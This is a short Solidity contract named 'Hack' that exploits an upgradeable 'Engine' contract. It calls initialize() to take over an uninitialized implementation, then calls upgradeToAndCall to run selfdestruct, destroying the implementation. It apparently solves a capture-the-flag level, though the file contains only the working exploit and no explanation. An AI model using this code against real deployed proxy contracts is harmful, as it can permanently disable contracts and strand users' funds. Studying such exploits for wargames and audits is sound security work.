// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Hack {
    IEngine engine;

    constructor(address contractAddress) {
        engine = IEngine(contractAddress);
    }

    function attack() public {
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));
    }

    function destruct() public {
        selfdestruct(payable(msg.sender));
    }
}
